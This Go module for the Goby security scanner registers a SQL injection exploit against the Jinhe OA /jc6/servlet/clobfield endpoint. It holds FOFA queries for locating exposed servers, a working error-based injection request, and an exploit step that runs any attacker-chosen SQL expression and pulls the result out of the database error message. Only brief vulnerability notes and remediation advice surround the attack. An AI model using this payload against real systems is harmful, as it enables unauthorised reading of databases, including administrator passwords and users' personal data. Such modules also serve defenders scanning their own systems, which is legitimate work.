package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Jinhe OA /jc6/servlet/clobfield SQL Injection Vulnerability",
    "Description": "<p>Jinhe Network is a professional information service provider that provides Internet + supervision solutions to urban regulatory authorities, and provides enterprises and institutions with services such as organizational collaboration OA system development platform, e-government integration platform, and smart e-commerce platform.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator backend passwords, site user personal information), attackers can even write Trojans into the server under high-privilege circumstances to further gain server system permissions.</p>",
    "Product": "Jinher-OA",
    "Homepage": "http://www.jinher.com/",
    "DisclosureDate": "2023-11-19",
    "PostTime": "2024-05-15",
    "Author": "secure_insights@163.com",
    "FofaQuery": "title=\"金和协同管理平台\" || body=\"js/PasswordCommon.js\" || body=\"js/PasswordNew.js\" || body=\"Jinher Network\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\") || header=\"Path=/jc6\" || (body=\"JC6金和协同管理平台\" && body=\"src=\\\"/jc6/platform/\") || body=\"window.location = \\\"JHSoft.MobileApp/Default.htm\\\";\" || banner=\"Path=/jc6\"",
    "GobyQuery": "title=\"金和协同管理平台\" || body=\"js/PasswordCommon.js\" || body=\"js/PasswordNew.js\" || body=\"Jinher Network\" || (body=\"c6/Jhsoft.Web.login\" && body=\"CloseWindowNoAsk\") || header=\"Path=/jc6\" || (body=\"JC6金和协同管理平台\" && body=\"src=\\\"/jc6/platform/\") || body=\"window.location = \\\"JHSoft.MobileApp/Default.htm\\\";\" || banner=\"Path=/jc6\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator backend passwords, site user personal information), attackers can even write Trojans into the server under high-privilege circumstances to further gain server system permissions.</p>",
    "Recommendation": "<p>1. The official has not fixed this vulnerability yet. Please contact the manufacturer to fix the vulnerability: <a href=\"http://www.jinher.com/\">http://www.jinher.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA%20jc6%20clobfield%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql_payload",
            "type": "input",
            "value": "@@version",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/jc6/servlet/clobfield",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
                    "Accept-Encoding": "gzip",
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": "167"
                },
                "data_type": "text",
                "data": "key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=11%27%2F**%2Fand%2F**%2FCONVERT%28int%2C%40%40version%29%3D1%2F**%2Fand%2F**%2F%27%27%3D%27"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "nvarchar",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulrul|lastbody|variable|{{{fixedhostinfo}}}/jc6/servlet/clobfield"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/jc6/servlet/clobfield",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
                    "Accept-Encoding": "gzip",
                    "Accept": "*/*",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": "167"
                },
                "data_type": "text",
                "data": "key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=11'/**/and/**/CONVERT(int,{{{sql_payload}}})=1/**/and/**/''='"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "nvarchar",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|nvarchar 值 '([^']+)' 转换成数据类型 int 时失败"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.4",
    "Translation": {
        "CN": {
            "Name": "金和OA /jc6/servlet/clobfield SQL 注入 漏洞",
            "Product": "金和网络-金和OA",
            "Description": "<p>金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。</p><p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.jinher.com/\" target=\"_blank\">http://www.jinher.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Jinhe OA /jc6/servlet/clobfield SQL Injection Vulnerability",
            "Product": "Jinher-OA",
            "Description": "<p>Jinhe Network is a professional information service provider that provides Internet + supervision solutions to urban regulatory authorities, and provides enterprises and institutions with services such as organizational collaboration OA system development platform, e-government integration platform, and smart e-commerce platform.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator backend passwords, site user personal information), attackers can even write Trojans into the server under high-privilege circumstances to further gain server system permissions.</p>",
            "Recommendation": "<p>1. The official has not fixed this vulnerability yet. Please contact the manufacturer to fix the vulnerability: <a href=\"http://www.jinher.com/\">http://www.jinher.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator backend passwords, site user personal information), attackers can even write Trojans into the server under high-privilege circumstances to further gain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10950"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}